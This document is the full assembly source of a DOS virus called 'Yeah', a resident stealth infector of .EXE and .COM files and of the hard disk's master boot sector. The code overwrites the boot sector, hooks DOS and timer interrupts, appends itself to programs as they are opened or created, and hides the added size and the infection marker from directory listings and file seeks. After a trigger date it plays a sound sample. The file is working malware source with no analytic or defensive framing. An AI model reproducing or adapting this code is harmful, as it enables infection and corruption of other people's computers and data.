;------------------------------------------------------------------------------
;
; Virus Name:  Yeah   
; Origin:      Holland
; Eff Length:  4,096 bytes
; Type Code:   PRhE - Parasitic Resident .EXE & partition table infector
;
;------------------------------------------------------------------------------
;
; This program is assembled with TASM V1.01 from Borland International
; (assembing with MASM V5.10 from Microsoft Inc. is also possible).
;
; TASM stealth;
; LINK stealth,,stealth;
;
;------------------------------------------------------------------------------
;
; Interrupt vectors
;
;------------------------------------------------------------------------------

iseg segment at 0
		org	8*4
Int8o		dw	0			; interrupt vector 21h
Int8s		dw	0

		org	1ch*4
Int1Co		dw	0			; interrupt vector 21h
Int1Cs		dw	0

		org	21h*4
Int21o		dw	0			; interrupt vector 21h
Int21s		dw	0

iseg ends

cseg segment public 'code'
		assume	cs:cseg,ds:cseg,es:cseg

;------------------------------------------------------------------------------
;
; Header of EXE-file
;
;------------------------------------------------------------------------------

VirusSize	equ	10d0h			; size of virus
PrgSize		equ	72h			; size of prg after the virus

Signature	dw	0			; signature 'MZ'
PartPage	dw	0			; size of partitial page
PageCount	dw	0			; number of pages
ReloCount	dw	0			; number of relocation items
HeaderSize	dw	0			; size of header
MinMem		dw	0			; minimum memory needed
MaxMem		dw	0			; maximum memory needed
ExeSS		dw	0			; initial SS 
ExeSP		dw	0 			; initial SP
CheckSum	dw	0			; unused ???
ExeIP		dw	0			; initial IP
ExeCS		dw	0			; initial CS
ReloOffset	dw	0			; offset of relocationtable
OverlayNr	dw	0			; number of overlay

ComSize		dw	-1			; Size of com-file (-1 for exe)

;------------------------------------------------------------------------------
;
; This procedure is called when starting from an exe-file
;
;------------------------------------------------------------------------------

Main:		pushf				; save flags
		sub	sp,4			; reserve space far cs:ip
		push	ax			; save other registers
		push	ds
		push	es
		sti				; enable interrupts
		cmp	cs:ComSize,-1		; com or exe-file
		je	ExeFile			; -1 : exe-file
ComFile:	mov	word ptr ds:[6],0fef0h	; set availeble memory to max
		mov	bp,sp			; set cs:ip on stack for
		mov	word ptr [bp+8],ds	;   returning to the orginal
		mov	word ptr [bp+6],100h	;   program
		mov	bp,ds			; bp : stacksegment
		mov	ax,cs			; bx : begin of com-file
		add	ax,(VirusSize/10h)
		mov	bx,ax
		mov	cx,0ff0h		; cx : size of data to move
		add	ax,cx			; es : buffer for mover and
		mov	es,ax			;      infecting the bootsect.
		push	cs			; ds : codesegment
		pop	ds
		jmp	short InfectBoot	; infect bootsector
ExeFile:	mov	dx,cs			; Relocation
		add	dx,(VirusSize/10h)
		mov	ds,dx
		mov	cx,ReloCount		; number of relocation items
		add	dx,HeaderSize		; size of exe-header
		mov	si,ReloOffset		; offset of 1st relocation item
		jcxz	NoRelo
NextRelo:	lodsw				; offset
		mov	di,ax
		lodsw				; segment
		add	ax,dx
		mov	es,ax
		mov	ax,cs			; relocation factor
		add	es:[di],ax
		loop	NextRelo		; next relocation item
NoRelo:		mov	bp,sp
		mov	ax,cs			; set cs:ip on stack for
		add	ax,ExeCS		;  returning to the orginal
		mov	[bp+8],ax		;  program
		mov	ax,ExeIP
		mov	[bp+6],ax
		mov	bp,cs			; bp : stacksegment
		add	bp,ExeSS
		mov	ax,PageCount		; calculate size of exe-file
		mov	dx,PartPage		; in paragraphs
		add	dx,-1
		sbb	ax,0
		mov	cl,4
		shr	dx,cl
		inc	dx
		inc	cl
		shl	ax,cl
		add	dx,ax
		add	dx,MinMem		; dx : size of exe-file
		mov	cx,dx			; cx : size of code and data
		sub	cx,HeaderSize
		mov	bx,cs			; bx : start of code and data
		mov	ds,bx
		add	bx,(VirusSize/10h)
		add	bx,dx
		mov	es,bx			; es : buffer for mover and
		sub	bx,cx			;      infecting the bootsect.
InfectBoot:	push	bx			; save bx and cx
		push	cx
		mov	ax,201h			; read bootsector from disk
		xor	bx,bx
		mov	cx,1
		mov	dx,80h
		int	13h
		jc	BootOk			; error ?
		mov	si,offset BootSector	; compare with infected code
		xor	di,di
		mov	cx,1*BootSize
		cld
		repe	cmpsb
		je	BootOk			; equal ?
		mov	di,1beh+8		; check partitions, we don't 
		mov	cx,4			; want to overwrite them
NextPartition:	cmp	word ptr es:[di+2],0
		ja	SectOk
		cmp	word ptr es:[di],(VirusSize+1ffh)/200h+1
		ja	SectOk
		cmp	word ptr es:[di],0
		ja	BootOk
SectOk:		add	di,10h
		loop	NextPartition
		mov	si,offset BootSector	; exchange code from bootsector
		xor	di,di			; with viral code
		mov	cx,1*BootSize
		cld
		call	Swapsb
		push	es			; write virus to disk
		pop	ds
		push	cs
		pop	es
		mov	ax,(VirusSize+1ffh)/200h+300h
		mov	cx,2
		int	13h
		push	ds
		pop	es
		push	cs
		pop	ds
		jc	BootOk			; error ?
		mov	ax,301h			; write bootsector to disk
		mov	cx,1
		int	13h
BootOk:		pop	cx			; restore bx and cx
		pop	bx
		mov	dx,cs			; dx = destenation segment
		xor	di,di
		push	es			; push seg:ofs of mover
		push	di
		push	cx			; save cx
		mov	cx,1*MoverSize
		mov	si,offset Mover
		cld					; copy mover-procedure
		rep	movsb
		pop	cx			; restore cx
		cli				; disable interrupts
		retf				; jump to mover

Mover:		mov	ax,cx			; save cx
		mov	ds,bx			; ds:si = source
		mov	es,dx			; es:di = destenation
		xor	si,si
		xor	di,di
		mov	cx,8h			; copy one paragraph
		rep	movsw
		inc	bx
		inc	dx
		mov	cx,ax			; restore cx
		loop	Mover			; next paragraph
		mov	ss,bp			; ss = new stacksegment
		sti				; enable interrupts
		pop	es			; restore registers
		pop	ds
		pop	ax
		iret				; jump to program

MoverSize	equ	($-Mover)

;------------------------------------------------------------------------------
;
; Bootsector startup
;
;------------------------------------------------------------------------------

Bootsector:	cli				; disable interrupts
		xor	bx,bx			; setup stack and ds
		mov	ds,bx
		mov	ss,bx
		mov	sp,7c00h
		sti				; enable interrupts
		mov	ax,ds:[413h]		; get size of base memory
		sub	ax,(VirusSize+3ffh)/400h; subtract virussize
		mov	ds:[413h],ax		; store new memory size
		mov	cl,6			; calculate segment
		shl	ax,cl
		mov	es,ax			; load virus in reserved mem
		mov	ax,(VirusSize+1ffh)/200h+200h
		mov	cx,2
		mov	dx,80h
		int	13h
		mov	bx,offset StartUp	; bx=offset startup
		push	es			; jump to startup (es:bx)
		push	bx
		retf

BootSize	equ	($-Bootsector)		; size of bootsector part

StartUp:	cli					; disable interrupts
		mov	ax,offset Interrupt1C		; hack interrupt 1C
		xchg	ax,ds:Int1Co
		mov	cs:OldInt1Co,ax
		mov	ax,cs
		xchg	ax,ds:Int1Cs
		mov	cs:OldInt1Cs,ax
		mov	cs:OldInt21o,-1
		mov	cs:OldInt21s,-1
		mov	cs:Count,-1
		sti				; enable interrupts
		push	cs			; ds=cs
		pop	es
		mov	si,7c00h		; di=7c00h (Bootsector)
		mov	di,offset BootSector	; si=BootSector
		mov	cx,1*BootSize		; bytes to copy
		cld				; copy forward
		call	Swapsb			; restore orginal boot
		mov	ax,7c00h		; offset bootsector
		push	ds			; jump to bootsector
		push	ax
		retf

Interrupt8:	push	ax			; save registers
		push	si
		push	ds
		push	cs
		pop	ds
		mov	si,SampleOffset		; get offset of next bit
		dec	byte ptr ds:SampleBit
		test	byte ptr ds:SampleBit,7
		jnz	OfsOk
		inc	si
		cmp	si,offset SampleEnd	; end of sample ?
		jb	OfsOk			; no, play bit
		mov	al,34h			; reset int 8 frequency
		out	43h,al
		xor	ax,ax
		out	40h,al
		out	40h,al
		mov	ds,ax			; reset int 8 vector
		mov	ax,cs:OldInt8o
		mov	ds:Int8o,ax
		mov	ax,cs:OldInt8s
		mov	ds:Int8s,ax		
		inc	byte ptr cs:SampleFlag	; set sample ready flag
		jmp	short ExitInt8		; end of interrupt
OfsOk:		mov	SampleOffset,si		; store offset
		rol	byte ptr ds:[si],1	; next bit
		mov	ah,ds:[si]		; get bit value
		and	ah,1
		shl	ah,1
		in	al,61h			; get value of io-port 61h
		and	al,0fch			; reset last 2 bits
		or	al,ah			; set bit 2 with sample value
		out	61h,al			; write to io-port 61h
ExitInt8:	mov	al,20h			; end of interrupt signal
		out	20h,al
		pop	ds			; restore registers
		pop	si
		pop	ax
		iret				; return to program

Interrupt1C:	push	ds			; save registers
		push	ax
		push	bx
		xor	ax,ax			; interrupts vectors
		mov	ds,ax
		mov	ax,ds:Int21o
		cmp	cs:OldInt21o,ax
		jne	Changed
		mov	ax,ds:Int21s
		cmp	cs:OldInt21s,ax
		je	Equal
Changed:	mov	ax,ds:Int21o
		mov	cs:OldInt21o,ax
		mov	ax,ds:Int21s
		mov	cs:OldInt21s,ax
		mov	cs:Count,182
		jmp	short NotReady
Equal:		dec	cs:Count
		jnz	NotReady
		mov	ax,cs:OldInt1Co		; restore vector 1C
		mov	ds:Int1Co,ax		; (This interrupt)
		mov	ax,cs:OldInt1Cs
		mov	ds:Int1Cs,ax
		mov	ax,offset Interrupt21	; Hack interrupt 21
		xchg	ax,ds:Int21o
		mov	cs:OldInt21o,ax
		mov	ax,cs
		xchg	ax,ds:Int21s
		mov	cs:OldInt21s,ax
		mov	ax,8
		mov	bx,offset Handle
NextHandle:	mov	word ptr cs:[bx],0
		inc	bx
		inc	bx
		dec	ax
		jnz	NextHandle
		mov	byte ptr cs:Active,-1
NotReady:	pop	bx
		pop	ax			; restore registers
		pop	ds
		jmp	cs:OldInt1C		; do orginal int 1C

Swapsb:		mov	al,es:[di]		; exchange two memory bytes
		xchg	al,ds:[si]
		stosb
		inc	si
		loop	Swapsb			; next byte
		ret				; return

;------------------------------------------------------------------------------
;
; Manipilated functions
;
;------------------------------------------------------------------------------

Functions	db	11h				; 1
		dw	offset FindFCB
		db	12h				; 2
		dw	offset FindFCB
		db	30h				; 3
		dw	offset DosVersion
		db	3ch				; 4
		dw	offset Open
		db	3dh				; 5
		dw	offset Open
		db	3eh				; 6
		dw	offset Close
		db	42h				; 7
		dw	offset Seek
		db	45h				; 8
		dw	offset Duplicate
		db	46h				; 9
		dw	offset Redirect
		db	4eh				; 10
		dw	offset Find
		db	4fh				; 11
		dw	offset Find
		db	5bh				; 12
		dw	offset Open
		db	6ch				; 13
		dw	offset OpenCreate

FunctionCount	equ	13

;------------------------------------------------------------------------------
;
; The orginal interrupt 21h is redirected to this procedure
;
;------------------------------------------------------------------------------

DosVersion:	push	ax
		push	cx
		push	dx
		push	ds
		push	cs
		pop	ds
		cmp	cs:Active,0
		je	NotActive
		mov	ah,2ah
		call	DOS
		cmp	ActiveYear,cx
		jb	NotActive
		cmp	ActiveDate,dx
		jb	NotActive
		cli
		xor	ax,ax
		mov	ds,ax
		mov	ax,offset Interrupt8
		xchg	ax,ds:Int8o
		mov	cs:OldInt8o,ax
		mov	ax,cs
		xchg	ax,ds:Int8s
		mov	cs:OldInt8s,ax
		mov	al,34h
		out	43h,al
		mov	al,80h
		out	40h,al
		mov	al,0
		out	40h,al
		push	cs
		pop	ds
		mov	byte ptr SampleFlag,0
		mov	byte ptr SampleBit,0
		mov	word ptr SampleOffset,offset SampleData
		sti
Delay:		cmp	byte ptr SampleFlag,0
		je	Delay
		mov	byte ptr Active,0
NotActive:	pop	ds
		pop	dx
		pop	cx
		pop	ax
		jmp	Old21

FindFCB:	call	DOS			; call orginal interrupt
		cmp	al,0			; error ?
		jne	Ret1
		pushf				; save registers
		push	ax
		push	bx
		push	es
		mov	ah,2fh			; get DTA
		call	DOS
		cmp	byte ptr es:[bx],-1	; extended fcb ?
		jne	FCBOk
		add	bx,8			; yes, skip 8 bytes
FCBOk:		mov	al,es:[bx+16h]		; get file-time (low byte)
		and	al,1fh			; seconds
		cmp	al,1fh			; 62 seconds ?
		jne	FileOk			; no, file not infected
		sub	word ptr es:[bx+1ch],VirusSize
		sbb	word ptr es:[bx+1eh],0	; adjust file-size
		jmp	short Time

Find:		call	DOS			; call orginal interrupt
		jc	Ret1			; error ?
		pushf				; save registers
		push	ax
		push	bx
		push	es
		mov	ah,2fh
		call	DOS
		mov	al,es:[bx+16h]		; get file-time (low byte)
		and	al,1fh			; seconds
		cmp	al,1fh			; 62 seconds ?
		jne	FileOk			; no, file not infected
		sub	word ptr es:[bx+1ah],VirusSize
		sbb	word ptr es:[bx+1ch],0	; change file-size
Time:		xor	byte ptr es:[bx+16h],1fh; adjust file-time
FileOk:		pop	es			; restore registers
		pop	bx
		pop	ax
		popf
Ret1:		retf	2			; return

Seek:		or	bx,bx			; bx=0 ?
		jz	Old21			; yes, do orginal interrupt
		push	bx
		call	FindHandle
		pop	bx
		jc	Old21
Stealth:	or	al,al			; seek from top of file ?
		jnz	Relative		; no, don't change cx:dx
		add	dx,VirusSize		; change cx:dx
		adc	cx,0
Relative:	call	DOS			; Execute orginal int 21h
		jc	Ret1			; Error ?
		sub	ax,VirusSize		; adjust dx:ax
		sbb	dx,0
		jmp	short Ret1		; return

Close:		or	bx,bx			; bx=0 ?
		je	Old21			; yes, do orginal interrupt
		push	ax
		push	cx
		push	dx
		push	si
		push	ds
		push	cs			; ds=cs
		pop	ds
		push	bx
		call	FindHandle
		mov	si,bx
		pop	bx
		jc	NotStealth
		mov	word ptr ds:[si],0
		call	UpdateHeader
NotStealth:	pop	ds			; restore registers
		pop	si
		pop	dx
		pop	cx
		pop	ax
Not2:		jmp	short Old21		; continue with orginal int

Interrupt21:	push	bx			; after an int 21h instruction
		push	cx			; this procedure is started
		mov	bx,offset Functions
		mov	cx,FunctionCount
NxtFn:		cmp	ah,cs:[bx]		; search function
		je	FunctionTrap
		add	bx,3
		loop	NxtFn
		pop	cx			; function not found
		pop	bx
Old21:		jmp	cs:OldInt21

FunctionTrap:	push	bp			; function found, start viral
		mov	bp,sp			; version of function
		mov	bx,cs:[bx+1]
		xchg	bx,[bp+4]
		mov	cx,[bp+10]
		xchg	cx,[bp+2]
		pop	bp
		popf
		ret

Duplicate:	call	DOS
		jc	Error
		pushf
		push	bx
		call	FindHandle
		jc	Ret3
		mov	bx,ax
		call	StoreHandle
Ret3:		pop	bx
		popf
		jmp	Ret2

Redirect:	call	DOS
		jc	Error
		pushf
		push	bx
		push	cx
		xchg	bx,cx
		call	FindHandle
		jc	Ret4
		mov	cs:[bx],cx
Ret4:		pop	cx
		pop	bx
		popf
		jmp	Ret2

OpenCreate:	or	al,al			; extended open/create function
		jne	Old21			; no, do orginal interrupt 21
		push	dx			; save dx
		mov	dx,si			; check extension of filename
		call	CheckName
		pop	dx			; retore dx
		jc	Old21			; exe or com-file?
		jmp	short ExtensionOk	; yes, infect file or use
						; stealth

Open:		call	CheckName		; exe or com-file ?
		jc	Old21			; no, do orginal int 21
ExtensionOk:	call	DOS			; do interrupt 21
		jnc	NoError			; error ?
Error:		jmp	Ret2			; yes, return and do nothing
NoError:	pushf				; save registers
		push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	cs
		pop	ds
		mov	bx,ax			; bx = file handle
		mov	ax,4400h		; get device information
		call	DOS
		jc	PopRet			; error ?
		test	dx,80h			; character device
		jnz	PopRet			; yes, return and do nothing
		call	EndOfFile		; get file size
		or	ax,dx			; 0 ?
		jnz	FileExists		; no, file already existed
FileCreated:	call	HandleFree
		jc	PopRet
		mov	ah,2ah
		call	DOS
		add	dh,3
		cmp	dh,12
		jbe	DateOk
		inc	cx
		sub	dh,12
DateOk:		mov	ActiveYear,cx
		mov	ActiveDate,dx
		mov	ah,40h			; write virus to file
		mov	cx,VirusSize
		call	Zero2
		jc	NoVir			; error ? yes, return
		xor	ax,cx			; entire virus written ?
		jnz	NoVir			; no, return
		call	StoreHandle
		jmp	short PopRet		; return
FileExists:	call	TopOfFile		; go to top of file
		call	HandleFree
		jc	PopRet			; no, do nothing
		call	ReadHeader		; read exe-header
		jc	NoVir			; error ?
		xor	ax,cx			; entire header read
		jne	NoVir			; no, not infected
		cmp	Signature,5a4dh		; signature = 'MZ' ?
		jne	NoVir			; no, not infected
		cmp	HeaderSize,ax		; headersize = 0 ?
		jne	NoVir			; no, not infected
		cmp	CheckSum,0DEADh		; checksum = DEAD hex
		jne	NoVir			; no, not infected
		call	StoreHandle
		mov	dx,VirusSize		; seek to end of virus
		jmp	short Infected
NoVir:		xor	dx,dx
Infected:	xor	cx,cx			; go to end of virus if file
		mov	ax,4200h		; is infected
		call	DOS
PopRet:		pop	ds			; restore registers
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf
Ret2:		retf	2			; return

;------------------------------------------------------------------------------

EndOfFile:	mov	ax,4202h		; go to end of file
		jmp	short Zero1

TopOfFile:	mov	ax,4200h		; go to top of file
Zero1:		xor	cx,cx
		jmp	short Zero2

WriteHeader:	mov	ah,40h			; write exe-header to file
		jmp	short Hdr

ReadHeader:	mov	ah,3fh			; read exe-header from file
Hdr:		mov	cx,1eh
Zero2:		xor	dx,dx

DOS:		pushf				; call orginal interrupt
		call	cs:OldInt21
		ret

FindHandle:	push	ax
		push	cx
		mov	ax,bx
		mov	bx,offset Handle
		mov	cx,8
NotFound:	cmp	ax,cs:[bx]
		je	Found
		inc	bx
		inc	bx
		loop	NotFound
		stc
Found:		pop	cx
		pop	ax
		ret

HandleFree:	push	bx
		xor	bx,bx
		call	FindHandle
		pop	bx
		ret

StoreHandle:	push	bx
		push	bx
		xor	bx,bx
		call	FindHandle
		pop	cs:[bx]
		pop	bx
		ret

CheckName:	push	ax			; check for .exe or .com
		push	cx			; save registers
		push	si
		push	di
		xor	ah,ah			; point found = 0
		mov	cx,100h			; max length filename = 100h
		mov	si,dx			; si = start of filename
		cld
NxtChr:		lodsb				; get byte
		or	al,al			; 0 ?
		je	EndName			; yes, check extension
		cmp	al,'\'			; \ ?
		je	Slash			; yes, point found = 0
		cmp	al,'.'			; . ?
		je	Point			; yes, point found = 1
		loop	NxtChr			; next character
		jmp	short EndName		; check extension
Slash:		xor	ah,ah			; point found = 0
		jmp	NxtChr			; next character
Point:		inc	ah			; point found = 1
		mov	di,si			; di = start of extension
		jmp	NxtChr			; next character
EndName:	cmp	ah,1			; point found = 0
		jne	NotExe			; yes, not an exe-file
		mov	si,di			; si = start of extension
		lodsw				; first 2 characters
		and	ax,0dfdfh		; uppercase
		mov	cx,ax
		lodsb				; 3rd character
		and	al,0dfh			; uppercase
		cmp	cx,04f43h		; extension = .com ?
		jne	NotCom
		cmp	al,04dh
		je	ChkRet
NotCom:		cmp	cx,05845h		; extension = .exe ?
		jne	NotExe
		cmp	al,045h
		je	ChkRet
NotExe:		stc				; set carry flag
ChkRet:		pop	di			; restore registers
		pop	si
		pop	cx
		pop	ax
		ret				; return

UpdateHeader:	mov	ax,4200h		; position read/write pointer
		xor	cx,cx			; at the end of the virus
		mov	dx,VirusSize
		call	DOS
		call	ReadHeader		; read orginal exe-header
		cmp	Signature,5a4dh
		je	InfectExe
InfectCom:	mov	Signature,5a4dh
		mov	ReloOffset,01ch
		mov	OverlayNr,0
		mov	ExeSS,(VirusSize-100h)/10h
		mov	ExeSP,0fffeh
		call	EndOfFile
		sub	ax,VirusSize
		sbb	dx,0
		mov	ComSize,ax
		mov	cx,10h
		div	cx
		sub	dx,1
		mov	dx,0ff2h+20h
		sbb	dx,ax
		mov	MinMem,dx
		jmp	WriteIt
InfectExe:	mov	ComSize,-1
		mov	ax,(VirusSize/10h)
		add	ax,HeaderSize
		add	ExeSS,ax
		add	MinMem,20h
		add	MaxMem,20h
		jnc	MaxOk
WriteIt:	mov	MaxMem,0ffffh
MaxOk:		mov	ReloCount,0
		mov	HeaderSize,0
		mov	CheckSum,0DEADh
		mov	ExeCS,0
		mov	ExeIP,offset Main
		call	EndOfFile
		mov	cx,200h
		div	cx
		mov	PartPage,dx
		add	dx,-1
		adc	ax,0
		mov	PageCount,ax
		call	TopOfFile
		call	WriteHeader		; write header at the top of
		jc	InfErr			; the virus
		mov	ax,5700h
		call	DOS
		mov	ax,5701h
		or	cl,1fh
		call	DOS
InfErr:		ret

;------------------------------------------------------------------------------
;
; Data to generate the 123 yeah sound
;
;------------------------------------------------------------------------------

SampleData	db	07dh,075h,05fh,0ffh,0ffh,0ffh,0ffh,0a0h,03fh,007h,0f8h,03ch,007h,0e0h,07fh,003h
		db	0c0h,0f8h,00fh,0c0h,0f0h,07ch,00fh,0c0h,0f8h,0f0h,01fh,081h,0ffh,081h,0fch,00ch
		db	07eh,007h,0f0h,071h,0f0h,03fh,007h,00fh,083h,0f0h,071h,0f8h,03fh,007h,01fh,003h
		db	0e0h,0e3h,0e0h,07ch,000h,0fch,00fh,080h,03fh,003h,0e0h,01fh,0c0h,0fch,007h,0f0h
		db	03fh,003h,0f8h,00fh,0c0h,0feh,003h,0f0h,07fh,001h,0f8h,03fh,0c0h,07eh,007h,0fch
		db	03fh,001h,0f8h,01eh,01fh,002h,03eh,00fh,0c0h,03fh,007h,0f0h,01fh,007h,0fch,00fh
		db	082h,0ffh,00fh,086h,00fh,038h,03eh,004h,03ch,01fh,008h,03eh,01fh,008h,03eh,00fh
		db	000h,07ch,00fh,080h,07ch,007h,0e0h,078h,0e1h,0f0h,0f0h,0e1h,0f0h,0f0h,0f0h,0f1h
		db	0e1h,0f0h,0e1h,0e1h,0f0h,0e3h,0c3h,0f0h,0cfh,007h,0f0h,01eh,00fh,0f0h,03eh,01eh
		db	078h,03ch,01ch,078h,038h,03ch,078h,078h,07ch,070h,0f0h,078h,0e1h,0c0h,070h,0c3h
		db	058h,061h,08eh,078h,0e3h,01ch,071h,0c6h,03ch,0e3h,08eh,030h,0e7h,01ch,071h,0c6h
		db	038h,0e1h,08eh,038h,0e3h,09ch,071h,0c7h,01ch,0f1h,0c7h,018h,0e3h,007h,038h,0e7h
		db	00fh,000h,0efh,00fh,001h,0e6h,00fh,0c1h,0e3h,01eh,003h,0e3h,08eh,0e1h,0dfh,087h
		db	0e1h,0c3h,0c6h,070h,07fh,003h,0f0h,073h,0f0h,03eh,007h,0ech,007h,0e0h,078h,070h
		db	07eh,00fh,00fh,007h,0c2h,063h,0e0h,07eh,008h,0f8h,01fh,080h,03eh,003h,0f0h,01fh
		db	080h,0fch,007h,0f0h,03fh,001h,0f8h,00fh,0c0h,0feh,003h,0f0h,01fh,0c0h,0f8h,01fh
		db	0e0h,07ch,01fh,0f0h,03eh,00fh,080h,01fh,00fh,0f0h,01fh,007h,0d0h,00fh,007h,0c3h
		db	00fh,007h,082h,00fh,007h,0c0h,00fh,007h,0c3h,00fh,007h,080h,00fh,007h,00ah,01fh
		db	00fh,08eh,01eh,01eh,00eh,03ch,01eh,01ch,03ch,03ch,018h,078h,07ch,018h,0f0h,078h
		db	0f1h,0f0h,0f0h,0e1h,0e1h,0e0h,0c3h,0c3h,0e1h,0c7h,083h,0c3h,08fh,00fh,003h,01eh
		db	01eh,00eh,01ch,03eh,01ch,078h,078h,038h,0f0h,0f0h,031h,0e1h,0ech,063h,0c3h,0c8h
		db	0c7h,087h,0f1h,08fh,00ch,0e3h,01eh,01bh,0c7h,01ch,027h,08eh,038h,047h,01ch,079h
		db	08eh,038h,071h,01eh,038h,0f2h,01ch,070h,0d6h,038h,0f1h,0c0h,038h,0f1h,0e0h,078h
		db	001h,0e4h,07dh,0f0h,0e0h,018h,018h,0f6h,03ch,088h,070h,01fh,0ech,078h,006h,004h
		db	03fh,087h,0f2h,01ch,083h,0fbh,01fh,0e1h,0f8h,007h,0f0h,0ffh,0c3h,0f8h,003h,0c0h
		db	0ffh,001h,0f8h,007h,080h,03fh,001h,0e0h,00ch,086h,07ch,063h,0c0h,01fh,060h,0fch
		db	023h,080h,038h,003h,0e0h,038h,0c0h,018h,0c7h,0f8h,0c7h,000h,000h,001h,0c7h,0b8h
		db	060h,008h,006h,01fh,0c7h,018h,002h,030h,00eh,03ch,01ch,000h,000h,001h,0f8h,01ch
		db	001h,087h,081h,0e1h,080h,0cch,006h,000h,0c6h,060h,000h,008h,007h,080h,000h,020h
		db	0e2h,000h,000h,020h,008h,008h,063h,0ech,004h,023h,024h,062h,08ch,0abh,052h,02dh
		db	0a8h,004h,09bh,034h,0a5h,0c6h,092h,0b4h,0a6h,099h,012h,0c1h,09dh,0a0h,02ch,0dbh
		db	034h,0cdh,0a8h,044h,098h,0f6h,024h,003h,07fh,0a0h,040h,01bh,0feh,000h,00bh,0ffh
		db	080h,001h,0ffh,0c0h,000h,0ffh,0f0h,000h,07fh,0f8h,000h,03fh,0f8h,000h,03fh,0f0h
		db	000h,03fh,0f8h,000h,03fh,0f0h,000h,07fh,0c0h,003h,0ffh,0c0h,003h,0ffh,000h,005h
		db	0feh,04eh,01dh,0e0h,031h,0ffh,000h,0c7h,0feh,000h,01fh,0feh,000h,03fh,0feh,000h
		db	03fh,0ffh,080h,03fh,0ffh,000h,047h,0f9h,082h,007h,0e7h,08ch,00fh,09fh,070h,03eh
		db	07fh,0c0h,071h,0bfh,000h,0e7h,07ch,003h,09fh,0f8h,00eh,03fh,0e0h,018h,0f7h,0c0h
		db	073h,0ffh,001h,0c7h,0fch,003h,00eh,0f8h,00eh,03fh,0e0h,018h,06fh,0c0h,070h,09fh
		db	080h,0e3h,07eh,003h,0c6h,0fch,007h,083h,0f8h,00eh,007h,0f0h,01ch,06fh,0c0h,078h
		db	01fh,0c0h,0f1h,07fh,001h,0e0h,0ffh,003h,0c1h,0feh,003h,083h,0fch,007h,007h,0f8h
		db	00fh,00fh,078h,00eh,00eh,0f8h,01eh,01eh,0f0h,01eh,03ch,0f0h,01ch,03dh,0e1h,05ch
		db	039h,0e1h,018h,07bh,0c2h,038h,073h,0c3h,038h,0f3h,086h,038h,0e7h,086h,070h,0e3h
		db	086h,070h,0e3h,084h,070h,0e3h,086h,070h,0e7h,08ch,070h,0e7h,08eh,070h,0e3h,086h
		db	071h,0c3h,086h,078h,0e3h,080h,079h,0e3h,082h,038h,0f1h,0c3h,01ch,0f9h,0c3h,01ch
		db	078h,0c1h,01eh,078h,0e1h,08fh,03ch,070h,08fh,03ch,030h,067h,08eh,038h,073h,086h
		db	018h,07bh,087h,08eh,03ch,0e3h,08fh,038h,060h,0e7h,08ch,038h,0f3h,087h,00eh,078h
		db	0c3h,01eh,070h,070h,0e7h,086h,021h,0e7h,007h,08ch,078h,00eh,03eh,0e0h,0f1h,0cfh
		db	000h,0f1h,0e7h,007h,01ch,078h,0c7h,01eh,078h,070h,0c7h,08eh,030h,067h,0c7h,08eh
		db	018h,0f3h,007h,070h,07ch,079h,0c1h,019h,033h,004h,0e3h,0cfh,003h,087h,03ch,070h
		db	0f1h,0c7h,00eh,03ch,0f1h,0e1h,087h,09ch,038h,061h,0e7h,08fh,01ch,03fh,087h,03ch
		db	00fh,0f3h,0c3h,086h,03ch,0f0h,018h,05fh,03eh,030h,0f1h,087h,0c6h,00fh,0f0h,0e3h
		db	0c7h,01fh,00eh,03ch,071h,087h,08eh,01fh,018h,079h,0c3h,08fh,01ch,01eh,018h,0f1h
		db	0e0h,007h,0cch,01eh,038h,071h,0e0h,0c7h,0c6h,01ch,07ch,0e0h,01ch,078h,07fh,010h
		db	07fh,0e0h,018h,0e1h,0cfh,018h,0e1h,0c0h,038h,0e7h,0c0h,01ch,079h,087h,038h,023h
		db	0ech,018h,0f1h,082h,078h,003h,0c6h,018h,07bh,0c1h,0f8h,001h,0cfh,018h,079h,0c1h
		db	00eh,038h,073h,0ddh,019h,0f1h,007h,03ch,070h,0e7h,008h,078h,0c3h,00eh,078h,023h
		db	08eh,018h,073h,0c7h,09eh,030h,0c3h,08eh,018h,0f1h,0c7h,00ch,070h,0e3h,08eh,03ch
		db	071h,0c3h,01ch,038h,0e1h,08fh,01ch,070h,0c7h,08eh,038h,061h,0c7h,01eh,038h,0e1h
		db	08fh,01ch,071h,0e7h,08ch,038h,0e3h,0c6h,01ch,078h,0e1h,00eh,01ch,078h,0c7h,08eh
		db	03ch,031h,0c3h,08fh,028h,070h,0e3h,086h,01ch,038h,0f1h,087h,00eh,038h,071h,0c3h
		db	08fh,01ch,078h,0e1h,0c3h,00eh,01ch,078h,0e1h,0c3h,08eh,01ch,078h,071h,0c1h,08fh
		db	08fh,0f8h,03dh,0f8h,018h,007h,0feh,002h,007h,0feh,006h,003h,0ffh,083h,0c1h,0ffh
		db	0c1h,081h,0f7h,0d1h,0c0h,0ffh,0c0h,0c1h,0f3h,0e1h,0c1h,0f7h,0e0h,0c1h,0e3h,0e1h
		db	0c1h,0e3h,0c1h,0c1h,0e3h,0c3h,083h,0c7h,083h,083h,0c7h,087h,007h,08fh,086h,00fh
		db	09eh,01ch,01eh,01ch,03ch,01ch,03ch,038h,078h,038h,0f0h,0f8h,0e0h,0f1h,0f1h,0c1h
		db	0e1h,0f3h,083h,087h,0deh,006h,00fh,03eh,01ch,03ch,07ch,038h,07ch,0f8h,060h,0ffh
		db	0c7h,083h,087h,087h,083h,00fh,00fh,087h,01fh,01fh,007h,09fh,01eh,007h,087h,00fh
		db	00fh,00fh,00fh,00eh,01eh,01eh,01ch,01eh,03eh,00ch,03ch,03eh,00ch,03ch,03eh,01ch
		db	01ch,07ch,03ch,038h,0f8h,078h,0f0h,0f0h,0f0h,0f1h,0f1h,0c1h,0f1h,0e3h,083h,0e1h
		db	0c0h,047h,0c7h,0c1h,08fh,00fh,086h,01eh,00fh,018h,078h,01ch,061h,0fch,071h,08eh
		db	071h,0c6h,031h,0c7h,030h,0c7h,018h,0e3h,08ch,0e3h,09eh,023h,08eh,078h,00eh,039h
		db	0c0h,078h,07fh,0e1h,0e0h,0f9h,0c3h,080h,0f3h,00fh,003h,0cch,03ch,0cfh,010h,073h
		db	01eh,0e0h,0c6h,07dh,007h,001h,0fch,004h,041h,0f3h,080h,0b1h,0eeh,040h,067h,01ch
		db	039h,09eh,03ch,0e6h,038h,003h,09ch,063h,00eh,079h,087h,00dh,0c7h,00ch,007h,08eh
		db	018h,00fh,09eh,006h,01fh,01fh,00ch,03eh,03eh,006h,03ch,01ch,01ch,07eh,03ch,038h
